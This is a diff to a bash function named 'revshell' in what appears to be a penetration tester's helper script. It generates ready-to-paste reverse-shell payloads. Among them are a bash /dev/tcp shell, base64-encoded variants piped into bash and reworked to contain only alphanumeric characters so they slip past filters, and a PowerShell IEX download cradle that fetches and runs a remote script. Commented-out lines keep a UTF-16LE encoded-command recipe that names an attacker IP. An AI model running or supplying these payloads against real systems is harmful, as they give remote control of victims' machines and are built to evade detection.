@@ -78,27 +78,31 @@ function revshell {
     export lport=1234
   fi
 
-  do_title_bar "linux rev shell"
-
-  bashshell=$(echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1")
-  echo "$bashshell"
-  echo "bash -c '$bashshell'"
-  echo "echo \"$(echo "$bashshell" | base64)\" | base64 -d | bash"
-
   do_title_bar "windows rev shell"
 
   echo "# Powershell execute script (like a reverse shell)" | lolcat
   echo "IEX(New-Object Net.WebClient).downloadString( \"http://$lhost:$lport/filename.ps1\" )"
   echo ""
 
-  downloadfiles "http://$lhost:$lport/filename.exe"
+  do_title_bar "linux rev shell"
 
-do_title_bar  "windows encoding"
-  echo "# Powershell encoded command (hacktricks)" | lolcat
-  cat << EOF
-kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
-PS> powershell -EncodedCommand <Base64>
-EOF
+  bashshell=$(echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1")
+  echo "$bashshell"
+  echo "bash -c '$bashshell'"
+
+  # optimize base64 to contain no special chars
+  echo "optimizing base 64..."
+  alnumb64=$(~/kb/bash-scripting/find-alphanum-base64.sh "$bashshell" | head -n 1)
+  echo "echo $alnumb64 | base64 -d | bash"
+
+  #downloadfiles "http://$lhost:$lport/filename.exe"
+
+#do_title_bar  "windows encoding"
+#  echo "# Powershell encoded command (hacktricks)" | lolcat
+#  cat << EOF
+#kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
+#PS> powershell -EncodedCommand <Base64>
+#EOF
   echo ""
 }
 
